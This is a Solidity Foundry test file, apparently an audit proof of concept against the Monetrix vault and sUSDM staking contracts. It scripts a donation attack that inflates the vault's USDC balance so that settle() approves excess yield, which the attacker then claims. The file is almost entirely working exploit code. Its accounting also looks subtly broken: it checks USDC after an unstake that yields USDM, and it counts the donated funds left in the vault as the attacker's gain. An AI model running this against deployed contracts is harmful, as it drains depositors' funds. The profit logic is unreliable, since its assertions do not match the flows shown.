// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/interfaces/IHyperCore.sol";

contract AuditAgentPoC is SimulatorBase {
    address attacker = address(0xA77);
    uint256 constant INITIAL_DEPOSIT = 100_000e6;
    uint256 constant DONATION_AMOUNT = 1_000_000e6;
    uint256 constant PROPOSED_YIELD = 100_000e6;

    function setUp() public {
        setUpSimulator();

        // Fund attacker with USDC
        vm.deal(attacker, 100 ether);
        deal(address(usdc), attacker, INITIAL_DEPOSIT + DONATION_AMOUNT);
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Attacker deposits USDC into Vault to get USDM, then deposits USDM into sUSDM
        // 2. [T=1] Attacker donates a large amount of USDC directly to the Vault (transient inflation)
        // 3. [T=2] Operator calls settle() which reads inflated usdc.balanceOf(vault) via totalBackingSigned()
        // 4. [T=3] Gate 3 passes, yield is injected into sUSDM, inflating the exchange rate
        // 5. [T=4] Attacker cools down and claims sUSDM shares, extracting the inflated yield
        // 6. [Assert] Verify attacker extracted more USDC than their initial principal

        // Step 1: Attacker deposits into Vault to get USDM
        vm.startPrank(attacker);
        usdc.approve(address(vault), INITIAL_DEPOSIT);
        vault.deposit(INITIAL_DEPOSIT);

        uint256 usdmBal = usdm.balanceOf(attacker);
        console.log("Step 1: Attacker USDM balance =", usdmBal);

        // Deposit USDM into sUSDM
        usdm.approve(address(susdm), usdmBal);
        uint256 shares = susdm.deposit(usdmBal, attacker);
        console.log("Step 1: Attacker sUSDM shares =", shares);
        vm.stopPrank();

        // Step 2: Attacker donates USDC directly to Vault (no deposit, raw transfer)
        vm.prank(attacker);
        usdc.transfer(address(vault), DONATION_AMOUNT);

        uint256 vaultUsdcBal = usdc.balanceOf(address(vault));
        console.log("Step 2: Vault USDC balance after donation =", vaultUsdcBal);

        int256 surplusBefore = accountant.surplus();
        console.logInt(surplusBefore);

        // Step 3: Operator settles daily PnL. The inflated USDC balance causes totalBackingSigned() 
        // to be huge, making distributableSurplus() pass the gate for a large proposedYield.
        vm.prank(operator);
        vault.settle(PROPOSED_YIELD);

        // Step 4: Attacker initiates cooldown to withdraw sUSDM
        vm.startPrank(attacker);
        uint256 reqId = susdm.cooldownShares(shares);
        console.log("Step 4: Cooldown request ID =", reqId);

        // Warp past cooldown period
        vm.warp(block.timestamp + 7 days);

        uint256 attackerUsdcBefore = usdc.balanceOf(attacker);

        // Claim the unstaked USDM (which includes the inflated yield)
        susdm.claimUnstake(reqId);

        uint256 attackerUsdcAfter = usdc.balanceOf(attacker);
        console.log("Step 5: Attacker USDC after claim =", attackerUsdcAfter);

        // The attacker deposited DONATION_AMOUNT + INITIAL_DEPOSIT total USDC into the ecosystem.
        // They get back their DONATION_AMOUNT (still in vault) + INITIAL_DEPOSIT + PROPOSED_YIELD.
        // Net profit = PROPOSED_YIELD.
        uint256 totalCost = INITIAL_DEPOSIT + DONATION_AMOUNT;

        assertGt(
            attackerUsdcAfter + vaultUsdcBal, // Attacker's claimed USDC + remaining donated USDC in vault
            totalCost, 
            "Attacker extracted excess yield from protocol reserves via transient donation"
        );

        // Specifically, the attacker's liquid USDC balance should be greater than their initial deposit
        // because they extracted the yield that was improperly approved by the inflated surplus.
        assertGt(
            attackerUsdcAfter,
            INITIAL_DEPOSIT,
            "Attacker profited in liquid USDC exceeding their initial principal"
        );

        vm.stopPrank();
    }
}
